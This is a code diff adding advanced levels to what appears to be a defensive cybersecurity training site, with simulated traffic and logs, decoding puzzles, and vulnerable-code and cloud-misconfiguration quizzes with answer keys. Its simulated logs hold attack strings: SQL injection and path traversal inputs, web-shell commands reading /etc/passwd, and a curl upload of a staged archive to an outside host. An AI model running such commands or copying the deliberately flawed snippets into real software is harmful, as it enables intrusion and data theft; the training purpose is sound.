@@ -49,6 +49,18 @@ export function capture(): Pkt[] {
   for (let h = 2; h <= 14; h++) add({ src: '10.0.5.99', dst: 'ff:ff:ff:ff:ff:ff', proto: 'ARP', len: 42, info: `Who has 10.0.5.${h}? Tell 10.0.5.99` });
   dnsq('10.0.5.44', 'portal.csusb.example.edu', '192.0.2.44');
   add({ src: '10.0.5.44', dst: '192.0.2.44', proto: 'TLS', sport: 54100, dport: 443, len: 517, info: 'Client Hello (SNI=portal.csusb.example.edu)' });
+  // ---- Advanced: what happened after the download
+  // Lateral movement: the infected host tries admin ports on internal servers
+  for (const [dst, port, ok] of [['10.0.5.20', 445, true], ['10.0.5.10', 3389, true], ['10.0.5.11', 5985, false], ['10.0.5.12', 22, false]] as [string, number, boolean][]) {
+    tcp('10.0.5.31', dst, 53400 + port % 100, port, 'SYN'); tcp(dst, '10.0.5.31', port, 53400 + port % 100, ok ? 'SYN,ACK' : 'RST,ACK');
+  }
+  // Gateway impersonation: a second MAC claims the router's IP
+  add({ src: '10.0.5.99', dst: '10.0.5.23', proto: 'ARP', len: 42, info: '10.0.5.1 is at 00:1a:2b:66:66:66' });
+  add({ src: '10.0.5.99', dst: '10.0.5.31', proto: 'ARP', len: 42, info: '10.0.5.1 is at 00:1a:2b:66:66:66' });
+  // Beaconing: identical small TLS hellos to one name, again and again
+  for (let k = 0; k < 6; k++) { add({ src: '10.0.5.57', dst: '203.0.113.200', proto: 'TLS', sport: 55010 + k, dport: 443, len: 233, info: 'Client Hello (SNI=status.cdn-check.example.com)' }); dnsq('10.0.5.23', `cdn${k}.example.com`, `192.0.2.${60 + k}`); }
+  // Exfiltration over HTTP POST to the server that hosted the malware
+  for (const len of [1514, 1514, 873]) add({ src: '10.0.5.31', dst: '198.51.100.77', proto: 'HTTP', sport: 53390, dport: 80, len, info: 'POST /api/v2/sync HTTP/1.1', method: 'POST', uri: '/api/v2/sync', host: 'invoice-portal.example.net', ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' });
   return P.map((p, i) => ({ ...p, no: i + 1 }));
 }
 
@@ -161,6 +173,14 @@ export function events(): Ev[] {
   for (const [k, q] of ["1'", "1' OR '1'='1", '1 UNION SELECT NULL,NULL--', "1 AND SLEEP(5)--", '1;DROP TABLE x--'].entries()) web(ts(11, 2, k * 3), '192.0.2.150', 'GET', `/courses/view.php?id=${encodeURIComponent(q)}`, k === 2 || k === 4 ? 500 : 200, sqlmap);
   for (const [k, f] of ['../../etc/passwd', '..%2f..%2f..%2fetc%2fshadow', '....//....//config.php'].entries()) web(ts(11, 30, k * 11), '192.0.2.150', 'GET', `/download.php?file=${f}`, k === 0 ? 200 : 403, 'curl/8.5.0');
   web(ts(11, 45, 2), '10.0.5.44', 'POST', '/login', 302, browsers[0]); web(ts(11, 46, 7), '10.0.5.44', 'GET', '/reports/export', 500, browsers[0]);
+  // ---- Advanced: the web shell and the return visit
+  const py = 'python-requests/2.32.3';
+  web(ts(12, 1, 15), '192.0.2.150', 'POST', '/profile/avatar', 200, py);
+  for (const [k, c] of ['id', 'whoami', 'uname -a', 'cat /etc/passwd'].entries()) web(ts(12, 2, 10 + k * 13), '192.0.2.150', 'GET', `/uploads/avatar.php?cmd=${encodeURIComponent(c)}`, 200, py);
+  web(ts(12, 5, 0), '10.0.5.23', 'GET', '/uploads/mlopez.png', 200, browsers[1]);
+  auth(ts(23, 41, 7), '192.0.2.201', 'sysupd', 'accepted');
+  E.push({ time: ts(23, 43, 30), source: 'auth', host: 'web01', src_ip: '192.0.2.201', user: 'sysupd', action: 'sudo', cmd: 'tar czf /tmp/.c.tgz /var/www/grades', raw: `${ts(23, 43, 30)} web01 sudo: sysupd : TTY=pts/1 ; USER=root ; COMMAND=tar czf /tmp/.c.tgz /var/www/grades` });
+  E.push({ time: ts(23, 44, 2), source: 'auth', host: 'web01', src_ip: '192.0.2.201', user: 'sysupd', action: 'sudo', cmd: 'curl -s -T /tmp/.c.tgz http://192.0.2.201/u', raw: `${ts(23, 44, 2)} web01 sudo: sysupd : TTY=pts/1 ; USER=root ; COMMAND=curl -s -T /tmp/.c.tgz http://192.0.2.201/u` });
   return E.sort((a, b) => a.time < b.time ? -1 : a.time > b.time ? 1 : 0);
 }
 export const EV_FIELDS = ['time', 'source', 'host', 'src_ip', 'user', 'action', 'cmd', 'method', 'path', 'status', 'ua'];
@@ -214,6 +234,8 @@ export const OPS: Op[] = [
   { id: 'urld', name: 'URL decode', run: s => decodeURIComponent(s) }, { id: 'rev', name: 'Reverse', run: s => [...s].reverse().join('') },
   { id: 'xor', name: 'XOR (hex in)', param: 'Key (0-255)', run: (s, n) => xorHex(s, n) },
   { id: 'frombin', name: 'From Binary', run: s => (s.match(/[01]{8}/g) || []).map(b => String.fromCharCode(parseInt(b, 2))).join('') },
+  { id: 'fromb64url', name: 'From Base64URL', run: s => { const t = s.trim().replace(/-/g, '+').replace(/_/g, '/'); return b64d(t + '='.repeat((4 - t.length % 4) % 4)); } },
+  { id: 'fromdec', name: 'From Decimal', run: s => (s.match(/\d+/g) || []).map(n => { const v = Number(n); if (v > 0x10ffff) throw new Error('too big'); return String.fromCodePoint(v); }).join('') },
 ];
 export function applyRecipe(input: string, recipe: { id: string; p: number }[]): string {
   let s = input;
@@ -226,6 +248,7 @@ export async function sha256(s: string): Promise<string> {
   try { if (globalThis.crypto?.subtle?.digest) d = await globalThis.crypto.subtle.digest('SHA-256', bytes); } catch { /* insecure origin or blocked digest: use the fallback */ }
   return [...(d ? new Uint8Array(d) : sha256Bytes(bytes))].map(b => b.toString(16).padStart(2, '0')).join('');
 }
+const b64u = (s: string) => b64e(s).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
 const xorEnc = (s: string, k: number) => [...s].map(c => (c.charCodeAt(0) ^ k).toString(16).padStart(2, '0')).join(' ');
 export const CRYPTO = [
   { id: 'b64', title: 'Base64', input: b64e('CISO{base64_is_not_encryption}'), q: 'Decode the message. What is the flag?', a: 'CISO{base64_is_not_encryption}', hints: ['Strings of letters, numbers, + and / that often end in = are usually Base64.', 'Add "From Base64" to the recipe.'], lesson: 'Base64 is an encoding, not encryption: anyone can reverse it, no key needed. You will see it in emails, web tokens and malware.' },
@@ -237,6 +260,10 @@ export const CRYPTO = [
   { id: 'xor', title: 'XOR', input: xorEnc('CISO{xor_needs_a_secret_key}', 42), q: 'These bytes were XORed with a single-byte key. The key is 42. What is the flag?', a: 'CISO{xor_needs_a_secret_key}', hints: ['Add "XOR (hex in)" and set the key.', 'Key = 42.'], lesson: 'XOR with a short, reused key is weak: knowing part of the plaintext reveals the key. Real encryption uses vetted algorithms like AES with random keys.' },
   { id: 'bin', title: 'Binary', input: [...'CISO{eight_bits_per_byte}'].map(c => c.charCodeAt(0).toString(2).padStart(8, '0')).join(' '), q: 'Decode the binary. What is the flag?', a: 'CISO{eight_bits_per_byte}', hints: ['Groups of eight 0s and 1s are bytes.', 'Add "From Binary".'], lesson: 'Every encoding here is just a different way of writing the same bytes.' },
   { id: 'hash', title: 'Hashing', input: 'CISO CyberHub', q: 'A hash is a fingerprint. Press "SHA-256 the input" and enter the first 8 characters of the hash.', a: '', hints: ['Use the "SHA-256 the input" button below the recipe, with the input unchanged.', 'Enter only the first 8 hex characters.'], lesson: 'Change one character and the hash changes completely. That is how you verify a download: compare its hash with the one the vendor published separately.' },
+  { id: 'adv-xor-key', title: 'Unknown XOR key', input: xorEnc('CISO{known_plaintext_breaks_xor}', 0x5c), q: 'XORed with a single-byte key nobody told you. You do know every flag starts with CISO{. What is the flag?', a: 'CISO{known_plaintext_breaks_xor}', hints: ['The first byte is "C" (hex 43) XOR the key. 0x1f XOR 0x43 = ?', 'The key is the first byte XOR 0x43. Convert it to decimal for the XOR step.', 'Key = 92.'], lesson: 'Known-plaintext attack: if you know part of the message, single-byte (and short repeating) XOR keys fall out immediately. Real ciphers resist this.' },
+  { id: 'adv-jwt', title: 'Read a JWT', input: [b64u('{"alg":"HS256","typ":"JWT"}'), b64u('{"sub":"jperez","role":"student","flag":"CISO{jwts_are_signed_not_encrypted}"}'), 'kq3VzEXAMPLEsignatureXyZ0'].join('.'), q: 'A token from an Authorization header. Decode the middle part (the payload). What is the value of the "flag" claim?', a: 'CISO{jwts_are_signed_not_encrypted}', hints: ['A JWT is header.payload.signature. Delete everything except the middle part.', 'JWTs use Base64URL (- and _ instead of + and /, no padding): use "From Base64URL".'], lesson: 'Anyone holding a JWT can read it. The signature only stops changes. Never put secrets in a token payload, and always verify the signature server-side.' },
+  { id: 'adv-decimal', title: 'Char codes', input: [...'CISO{char_codes_in_a_script}'].map(c => c.charCodeAt(0)).join(','), q: 'Found in an obfuscated PowerShell script as [char[]](...). What does it spell?', a: 'CISO{char_codes_in_a_script}', hints: ['Numbers between 32 and 126 are printable ASCII characters.', 'Add "From Decimal".'], lesson: 'Malware hides strings as character codes so simple keyword scanners miss them. Decoding them is everyday work in script triage.' },
+  { id: 'adv-onion', title: 'Five layers', input: b64e(hexe([...shift(b64e('CISO{peel_it_like_an_analyst}'), 13)].reverse().join(''))), q: 'Five layers, in an order you have to work out. What is the flag?', a: 'CISO{peel_it_like_an_analyst}', hints: ['Outside first: Base64, then hex.', 'The result looks like Base64 but backwards and letter-shifted. Undo both.', 'From Base64 → From Hex → Reverse → ROT13 → From Base64.'], lesson: 'Layered encoding is cheap for attackers and slow for analysts without a recipe tool. Save your recipes: the same malware family reuses them.' },
 ];
 
 /* ============================================================ Secure Code Review */
@@ -290,6 +317,31 @@ export const REVIEW: Snip[] = [
     code: ['SecurityGroup:', '  Ingress:', '    - Port: 443', '      Source: 0.0.0.0/0', '    - Port: 22', '      Source: 0.0.0.0/0'],
     fixes: ['Limit SSH to the admin VPN range or use a bastion / session manager', 'Move SSH to port 2222', 'Remove the HTTPS rule instead'],
     why: 'SSH open to the whole internet invites brute force (see the Log Hunt). Public HTTPS is expected for a website; management ports should not be. Changing the port only hides from lazy scans.' },
+  // ---- Advanced
+  { id: 'adv-ssrf', title: 'Link preview', lang: 'Python', cwe: 'CWE-918 Server-side request forgery', bad: 4, fix: 2,
+    code: ['@app.post("/preview")', 'def preview():', '    url = request.json["url"]', '    page = requests.get(url, timeout=5)', '    return {"title": extract_title(page.text)}'],
+    fixes: ['Only allow URLs that start with https://', 'Add a shorter timeout', 'Resolve the host, refuse private, loopback and link-local addresses (like 169.254.169.254), and allow only expected domains'],
+    why: 'The server fetches whatever URL it is given, including internal services and the cloud metadata endpoint that hands out credentials. "https only" still allows https://internal-admin. Check where the name resolves, not just how it is spelled.' },
+  { id: 'adv-race', title: 'Gift card redeem', lang: 'Python', cwe: 'CWE-362 Race condition', bad: 4, fix: 0,
+    code: ['def redeem(user, card_id):', '    card = Card.get(card_id)', '    if card.used: abort(400)', '    user.balance += card.value', '    card.used = True', '    db.commit()'],
+    fixes: ['Mark the card used and credit the balance in one atomic update (UPDATE ... SET used = true WHERE id = ? AND used = false) and only credit if a row changed', 'Check card.used twice', 'Add a CAPTCHA to the form'],
+    why: 'Send 20 redeem requests at the same instant and many pass the "if card.used" check before any of them sets it. The check and the change must happen in one atomic step.' },
+  { id: 'adv-second-order', title: 'Admin report', lang: 'Python', cwe: 'CWE-89 Second-order SQL injection', bad: 4, fix: 1,
+    code: ['def activity_report(user_id):', '    user = db.execute("SELECT username FROM users WHERE id = %s", (user_id,)).one()', '    # username was stored safely at sign-up', '    rows = db.execute(f"SELECT * FROM logins WHERE username = \'{user.username}\'")', '    return render_report(rows)'],
+    fixes: ['Escape the username when the user signs up', 'Parameterize this query too: db.execute("SELECT * FROM logins WHERE username = %s", (user.username,))', 'Only admins can open the report, so it is fine'],
+    why: 'The first query is safe, but data that came from a user is still user data when you read it back. A username like x\' OR \'1\'=\'1 fires later, inside the admin report. Parameterize every query.' },
+  { id: 'adv-mass-assign', title: 'Profile update', lang: 'Python', cwe: 'CWE-915 Mass assignment', bad: 4, fix: 2,
+    code: ['@app.patch("/me")', '@login_required', 'def update_me():', '    current_user.update(**request.json)', '    db.commit()', '    return current_user.public()'],
+    fixes: ['Validate that the JSON is under 1 KB', 'Log every profile change', 'Copy only allowed fields (display_name, bio) from the request; never is_admin, role or balance'],
+    why: 'Send {"is_admin": true} and the model happily saves it. Accept an explicit allow-list of fields for each endpoint.' },
+  { id: 'adv-alg', title: 'Token verify', lang: 'Python', cwe: 'CWE-347 Algorithm confusion', bad: 3, fix: 0,
+    code: ['def verify(token):', '    header = jwt.get_unverified_header(token)', '    return jwt.decode(token, PUBLIC_KEY, algorithms=[header["alg"]])'],
+    fixes: ['Pin the algorithm the server expects: algorithms=["RS256"]', 'Check that alg is not empty', 'Lower-case the alg first'],
+    why: 'The attacker chooses the algorithm. With "HS256" they can sign a token using your public key as the HMAC secret; some libraries even accept "none". The server, not the token, decides the algorithm.' },
+  { id: 'adv-timing', title: 'Webhook check', lang: 'Python', cwe: 'CWE-208 Timing side channel', bad: 4, fix: 1,
+    code: ['def valid_webhook(req):', '    sig = req.headers.get("X-Signature", "")', '    expected = hmac.new(SECRET, req.body, "sha256").hexdigest()', '    return sig == expected'],
+    fixes: ['Compare lower-case versions', 'return hmac.compare_digest(sig, expected)', 'Reject signatures shorter than 64 characters'],
+    why: '== stops at the first different character, so response time leaks how many characters were right. Over many requests that can rebuild a valid signature. Constant-time comparison removes the signal.' },
 ];
 
 /* ============================================================ Labs: levels and checks */
@@ -304,6 +356,12 @@ export const PCAP_LEVELS: Level[] = [
   { id: 'domain', title: 'Where did it come from?', q: 'Which domain name served that download?', a: 'invoice-portal.example.net', hints: ['Check the HTTP Host header: http.host contains "invoice"', 'Or find the DNS query 10.0.5.31 made just before.'], lesson: 'DNS and HTTP Host headers tie an IP to a name. Blocking the domain and searching for other hosts that resolved it is the next SOC step.' },
   { id: 'tunnel', title: 'Data hiding in DNS', q: 'One host sends DNS TXT queries with long, random-looking names, all ending in the same domain. Which domain (the last three labels)?', a: 'cdn-sync.example.org', hints: ['Filter dns && ip.src == 10.0.5.52', 'Ignore the random first label: what do the names end with?'], lesson: 'DNS tunneling smuggles data out inside query names. Long, high-entropy labels to one rare domain are the giveaway.' },
   { id: 'arp-sweep', title: 'Rogue device', q: 'An internal device is asking for every address on the subnet. Which IP is it?', a: '10.0.5.99', hints: ['Filter arp', 'Which host sends "Who has" for many different addresses in a row?'], lesson: 'An ARP sweep maps the local network. A device you do not recognize doing it deserves a visit.' },
+  // ---- Advanced
+  { id: 'adv-pivot', title: 'Lateral movement', q: 'After the download, 10.0.5.31 tried admin ports on four internal servers. Which ports accepted the connection? Lowest first, comma-separated.', a: '445,3389', hints: ['Filter the replies sent back to 10.0.5.31 from 10.0.5.x servers: ip.dst == 10.0.5.31 && tcp.flags.syn == 1', 'SYN,ACK means the port is open; RST means closed.'], lesson: 'A workstation suddenly talking SMB and RDP to servers is how one infected laptop becomes a breach. Internal segmentation and alerting on new admin connections catch it.' },
+  { id: 'adv-spoof', title: 'Gateway impersonation', q: 'Two different MAC addresses claim to be the gateway 10.0.5.1. What is the impostor\'s MAC?', a: '00:1a:2b:66:66:66', hints: ['arp && info contains "10.0.5.1 is at"', 'The real router answered first, earlier in the capture. Which reply came from 10.0.5.99?'], lesson: 'ARP spoofing puts the attacker in the middle of every connection on the subnet. Dynamic ARP inspection on switches stops it.' },
+  { id: 'adv-beacon', title: 'Beaconing', q: 'One host keeps opening TLS connections to the same name with exactly the same packet size. Which name (SNI)?', a: 'status.cdn-check.example.com', hints: ['tls && info contains "Client Hello"', 'Look for the same length repeated: try frame.len == 233'], lesson: 'Malware checks in on a schedule with near-identical packets. Regular timing and size are a stronger signal than any single packet.' },
+  { id: 'adv-exfil', title: 'How much left?', q: 'The infected host POSTed data back to the malware server. How many bytes in total (add up frame.len of those POST packets)?', a: '3901', hints: ['http.request.method == "POST" && ip.dst == 198.51.100.77', 'Click each packet to read its Length, then add them.'], lesson: 'Sizing exfiltration tells legal and leadership what might be gone. Captures give you exact numbers; flow logs give estimates.' },
+  { id: 'adv-tunnel-decode', title: 'Decode the tunnel', q: 'Decode the first label of the second tunneled DNS query (it is Base64). Which file is leaving the network? Give the file name only.', a: ['usernames.csv', 'usernames.csv.part1'], hints: ['dns && ip.src == 10.0.5.52, then take the second query.', 'Copy the part before .t1. into the Crypto & Encoding Lab and use From Base64.'], lesson: 'DNS tunnels split stolen files into labels. Decoding a few tells you what was taken, which changes who you have to notify.' },
 ];
 export const HUNT_LEVELS: Level[] = [
   { id: 'fails', title: 'Count the failures', start: 'source=auth action=failed', q: 'How many failed SSH logins are in the logs?', a: '48', hints: ['Run the starting query and read the result count.'], lesson: 'Start every hunt by measuring. One or two failures is normal; dozens is not.' },
@@ -315,6 +373,12 @@ export const HUNT_LEVELS: Level[] = [
   { id: 'sqlmap', title: 'Web attack tool', q: 'One web client is an automated SQL injection tool. What is the tool called?', a: 'sqlmap', hints: ['source=web | stats count by ua'], lesson: 'Attack tools often announce themselves in the User-Agent. Real attackers change it, so also look at the requests themselves.' },
   { id: 'traversal', title: 'Path traversal', q: 'Which page (the path before the ?) received ../ path traversal attempts?', a: '/download.php', hints: ['Search the raw text: ../', 'Encoded versions use %2f for /.'], lesson: 'The first attempt got a 200: the server returned /etc/passwd. Check status codes to tell attempts from successes.' },
   { id: 'errors', title: 'Server errors', q: 'How many web requests returned HTTP 500?', a: '3', hints: ['source=web status=500'], lesson: 'Errors during an injection attack can mean the payload broke a query. They are worth investigating, not just fixing.' },
+  // ---- Advanced
+  { id: 'adv-usernames', title: 'How many guesses?', q: 'How many different usernames did 203.0.113.66 try?', a: '6', hints: ['src_ip=203.0.113.66 action=failed | stats count by user', 'Count the rows.'], lesson: 'Few usernames, many tries each is brute force. Many usernames, one try each is spraying. The shape decides the fix.' },
+  { id: 'adv-webshell', title: 'Web shell', q: 'After the SQL injection, 192.0.2.150 uploaded a file and then ran commands through it. Which path did the commands go to (before the ?)?', a: '/uploads/avatar.php', hints: ['src_ip=192.0.2.150 | table time,method,path', 'Look for cmd= in the path.'], lesson: 'An "avatar" that ends in .php and takes a cmd parameter is a web shell. Uploads must be stored outside the web root and never executed.' },
+  { id: 'adv-first-cmd', title: 'First command', q: 'What was the first command run through the web shell?', a: 'id', hints: ['path=/uploads/avatar.php* | head 1', 'Decode %20 as a space if needed.'], lesson: 'Attackers almost always start with id or whoami to learn which account they landed as. Alert on those commands from web server processes.' },
+  { id: 'adv-return', title: 'The return visit', q: 'That night the persistence account came back. From which IP did sysupd log in?', a: '192.0.2.201', hints: ['user=sysupd action=accepted'], lesson: 'Resetting the breached password is not enough if the attacker made their own account. Hunt for every account created during the incident window.' },
+  { id: 'adv-staging', title: 'Staging', q: 'sysupd packed data into a hidden archive before sending it out. What is the full path of the archive?', a: '/tmp/.c.tgz', hints: ['user=sysupd action=sudo | table time,cmd'], lesson: 'tar into a dot-file in /tmp, then curl out: collect, stage, exfiltrate. Each step is a detection opportunity.' },
 ];
 export function cryptoLevels(): Level[] { return CRYPTO.map(c => ({ id: c.id, title: c.title, q: c.q, a: c.a, hints: c.hints, lesson: c.lesson })); }
 
@@ -341,6 +405,10 @@ export function adEvents(): Rec[] {
   add({ time: ts(10, 4, 30), event_id: 4728, group: 'Domain Admins', member: 'svc_backup', by: 'svc_backup', user: 'svc_backup', src_ip: '10.10.20.77' }, 'A member was added to a security-enabled global group Group=Domain Admins Member=svc_backup SubjectAccount=svc_backup');
   add({ time: ts(10, 9, 2), event_id: 4662, user: 'svc_backup', src_ip: '10.10.20.77', status: 'DS-Replication-Get-Changes-All' }, 'An operation was performed on an object Account=svc_backup Properties={1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} DS-Replication-Get-Changes-All');
   add({ time: ts(10, 15, 48), event_id: 1102, user: 'svc_backup', src_ip: '10.10.20.77' }, 'The audit log was cleared SubjectAccount=svc_backup');
+  // ---- Advanced (these reached the SIEM even after the local log was cleared)
+  add({ time: ts(10, 12, 20), event_id: 4720, user: 'it_support2', by: 'svc_backup', src_ip: '10.10.20.77', status: 'created' }, 'A user account was created NewAccount=it_support2 SubjectAccount=svc_backup');
+  add({ time: ts(10, 12, 51), event_id: 4728, group: 'Domain Admins', member: 'it_support2', by: 'svc_backup', user: 'svc_backup', src_ip: '10.10.20.77' }, 'A member was added to a security-enabled global group Group=Domain Admins Member=it_support2 SubjectAccount=svc_backup');
+  ['fileserver01$', 'sql01$', 'backup01$'].forEach((svc, k) => add({ time: ts(10, 30, k * 4), event_id: 4769, user: 'Administrator', src_ip: '10.10.20.77', service: svc, enc: '0x17', status: '0x0' }, `Kerberos service ticket requested Account=Administrator Service=${svc} TicketEncryption=0x17`));
   return E.sort((a, b) => String(a.time) < String(b.time) ? -1 : String(a.time) > String(b.time) ? 1 : 0);
 }
 export const AD_LEVELS: Level[] = [
@@ -352,6 +420,10 @@ export const AD_LEVELS: Level[] = [
   { id: 'dcsync', title: 'DCSync', q: 'Event 4662 with DS-Replication-Get-Changes-All from an account that is not a domain controller means DCSync: copying every password hash. At what time (HH:MM) did it happen?', a: ['10:09', '10:09:02'], hints: ['event_id=4662'], lesson: 'DCSync abuses replication rights to pull every hash, including krbtgt. Treat it as full domain compromise: reset krbtgt twice and rebuild trust.' },
   { id: 'cleared', title: 'Covering tracks', q: 'What event ID shows the attacker cleared the security log?', a: '1102', hints: ['Search for the word: cleared'], lesson: 'Clearing logs is a loud signal, and forwarding logs to a SIEM means the evidence survives anyway.' },
   { id: 'asrep', title: 'Hidden weakness', q: 'One account requests tickets without Kerberos pre-authentication (PreAuthType 0), so anyone can request its hash. Which account?', a: 'intern01', hints: ['preauth=0'], lesson: 'Accounts with "Do not require Kerberos preauthentication" are AS-REP roastable. Turn that setting off unless something truly needs it.' },
+  // ---- Advanced
+  { id: 'adv-backdoor', title: 'Backdoor account', q: 'Before clearing the log, the attacker created a new account (event 4720). What is it called?', a: 'it_support2', hints: ['event_id=4720'], lesson: 'Attackers create accounts that look like IT staff. New accounts created by a service account should never happen.' },
+  { id: 'adv-backdoor-group', title: 'Where did it go?', q: 'Which group was that new account added to?', a: 'Domain Admins', hints: ['member=it_support2'], lesson: 'Check every privileged group after an incident, not just the account you know about. One missed backdoor means the attacker walks back in.' },
+  { id: 'adv-golden', title: 'Forged tickets', q: 'After DCSync, Administrator received service tickets from 10.10.20.77, yet Administrator never requested a TGT (event 4768) that day. Which attack does that point to? (two words)', a: ['golden ticket', 'goldenticket'], hints: ['user=Administrator | table time,event_id,src_ip,service', 'Now search event_id=4768 user=Administrator. Nothing? The TGT was made somewhere else.', 'DCSync stole the krbtgt hash, which signs every TGT.'], lesson: 'With the krbtgt hash an attacker forges TGTs for any user, offline. Recovery means resetting krbtgt twice and treating the domain as compromised.' },
 ];
 
 /* ============================================================ Cloud Security Lab */
@@ -404,6 +476,27 @@ export const CLOUD: Snip[] = [
     code: ['{', '  "FunctionName": "send-reminders",', '  "Runtime": "python3.12",', '  "Environment": { "SMTP_PASSWORD": "Spring2026!" }', '}'],
     fixes: ['Base64-encode the password', 'Store it in Secrets Manager (or Parameter Store) and give the function permission to read only that secret', 'Move it to a comment in the code'],
     why: 'Anyone who can read the function configuration sees the password, and it ends up in templates and logs. Secret stores add access control, auditing and rotation.' },
+  // ---- Advanced
+  { id: 'adv-passrole', title: 'Developer policy', lang: 'AWS IAM policy (JSON)', cwe: 'Privilege escalation through iam:PassRole', bad: 5, fix: 1,
+    code: ['{', '  "Statement": [', '    { "Effect": "Allow", "Action": ["ec2:RunInstances", "ec2:Describe*"], "Resource": "*" },', '    { "Effect": "Allow", "Action": "s3:*", "Resource": "arn:aws:s3:::dev-scratch/*" },', '    { "Effect": "Allow", "Action": "iam:PassRole", "Resource": "*" }', '  ]', '}'],
+    fixes: ['Remove ec2:Describe*', 'Allow iam:PassRole only for the one role the app needs, with an iam:PassedToService condition', 'Move s3:* to a separate policy'],
+    why: 'PassRole on * lets a developer launch an instance with the admin role attached, then use its credentials. The policy never says "admin", but it grants it.' },
+  { id: 'adv-trust', title: 'Cross-account role', lang: 'AWS role trust policy (JSON)', cwe: 'Anyone can assume the role', bad: 4, fix: 2,
+    code: ['{', '  "Statement": [{', '    "Effect": "Allow",', '    "Principal": { "AWS": "*" },', '    "Action": "sts:AssumeRole"', '  }]', '}'],
+    fixes: ['Add a Deny for sts:TagSession', 'Shorten the session to one hour', 'Name the partner\'s account ID as the Principal and require an sts:ExternalId condition'],
+    why: 'Principal * in a trust policy means any AWS account in the world can assume this role. Trust exactly one account, and use an external ID for vendors.' },
+  { id: 'adv-imds', title: 'Web server instance', lang: 'Terraform (HCL)', cwe: 'Credentials reachable through SSRF', bad: 5, fix: 0,
+    code: ['resource "aws_instance" "web" {', '  ami           = var.ami', '  instance_type = "t3.small"', '  metadata_options {', '    http_tokens = "optional"', '  }', '  iam_instance_profile = aws_iam_instance_profile.web.name', '}'],
+    fixes: ['Require IMDSv2: http_tokens = "required" (and a hop limit of 1)', 'Use a bigger instance type', 'Remove the AMI variable'],
+    why: 'With IMDSv1 allowed, one SSRF bug (see Secure Code Review) can read 169.254.169.254 and steal the instance role\'s keys, which is how the 2019 Capital One breach worked. IMDSv2 needs a session token an SSRF usually cannot get.' },
+  { id: 'adv-privileged-pod', title: 'Log collector pod', lang: 'Kubernetes (YAML)', cwe: 'Container escape to the node', bad: 7, fix: 1,
+    code: ['apiVersion: v1', 'kind: Pod', 'metadata: { name: log-agent }', 'spec:', '  containers:', '  - name: agent', '    securityContext: { privileged: true }', '    volumeMounts: [{ name: host, mountPath: /host }]', '  volumes: [{ name: host, hostPath: { path: / } }]'],
+    fixes: ['Pin the image tag', 'Drop privileged, mount only /var/log read-only, and run as non-root', 'Put the pod in its own namespace'],
+    why: 'privileged: true plus the whole host filesystem means anyone who breaks into this container owns the node, and often the cluster. Mount only what the agent reads.' },
+  { id: 'adv-allauth', title: 'Research bucket', lang: 'Google Cloud IAM binding (YAML)', cwe: 'Exposed to every Google account', bad: 3, fix: 2,
+    code: ['bindings:', '- role: roles/storage.objectViewer', '  members: [allAuthenticatedUsers]', 'etag: BwYk2EXAMPLE'],
+    fixes: ['Change the role to objectAdmin', 'Add an etag check', 'Grant the role to the research group only, e.g. group:research@isu.example'],
+    why: '"Authenticated" sounds safe, but allAuthenticatedUsers means anyone with any Google account, which is nearly everyone. Grant named groups.' },
 ];
 
 /* ============================================================ UI */
@@ -418,7 +511,9 @@ if (root) {
   const levels: Level[] = lab === 'pcap' ? PCAP_LEVELS : lab === 'hunt' ? HUNT_LEVELS : lab === 'ad' ? AD_LEVELS : lab === 'crypto' ? cryptoLevels() : SNIPS.map(r => ({ id: r.id, title: r.title, q: '', a: '', hints: [], lesson: r.why }));
   let cur = 0, hintN = 0;
   const nav = $('#ch-lvls');
-  levels.forEach((l, i) => { const b = el('button', String(i + 1)); b.type = 'button'; b.dataset.i = String(i); b.title = l.title; b.setAttribute('aria-label', `Level ${i + 1}: ${l.title}`); b.addEventListener('click', () => open(i)); nav.append(b); });
+  const adv = (l: Level) => l.id.startsWith('adv-');
+  levels.forEach((l, i) => { if (adv(l) && (i === 0 || !adv(levels[i - 1]))) nav.append(el('span', 'Advanced', 'label ch-adv-sep'));
+    const b = el('button', String(i + 1)); b.type = 'button'; b.dataset.i = String(i); b.title = l.title + (adv(l) ? ' (Advanced)' : ''); if (adv(l)) b.classList.add('adv'); b.setAttribute('aria-label', `Level ${i + 1}${adv(l) ? ', advanced' : ''}: ${l.title}`); b.addEventListener('click', () => open(i)); nav.append(b); });
   const mark = () => nav.querySelectorAll<HTMLButtonElement>('button').forEach(b => { const i = Number(b.dataset.i); b.classList.toggle('done', solved.includes(levels[i].id)); b.setAttribute('aria-current', String(i === cur)); });
   const status = () => { $('#ch-count').textContent = `${solved.filter(id => levels.some(l => l.id === id)).length} of ${levels.length} solved`; };
   const win = () => { const L = levels[cur]; if (!solved.includes(L.id)) { solved.push(L.id); save(); } const r = $('#ch-lesson'); r.hidden = false; r.querySelector('p')!.textContent = L.lesson; ($('#ch-next') as HTMLButtonElement).hidden = cur >= levels.length - 1; mark(); status(); };
@@ -467,7 +562,7 @@ if (root) {
   }
 
   function open(i: number) {
-    cur = i; hintN = 0; const L = levels[i]; $('#ch-lvl').textContent = `Level ${i + 1} of ${levels.length}: ${L.title}`; if (lab !== 'review' && lab !== 'cloud') $('#ch-q').textContent = L.q;
+    cur = i; hintN = 0; const L = levels[i]; $('#ch-lvl').textContent = `Level ${i + 1} of ${levels.length}${adv(L) ? ' · Advanced' : ''}: ${L.title}`; if (lab !== 'review' && lab !== 'cloud') $('#ch-q').textContent = L.q;
     $('#ch-lesson').hidden = true; fb.textContent = ''; const hb = root!.querySelector<HTMLButtonElement>('#ch-hint'); if (hb) { hb.hidden = !L.hints.length; hb.textContent = 'Stuck? Get a hint'; }
     root!.querySelector<HTMLElement>('#ch-hints')?.replaceChildren(); const a = root!.querySelector<HTMLInputElement>('#ch-a'); if (a) a.value = '';
     onOpen(L); mark();
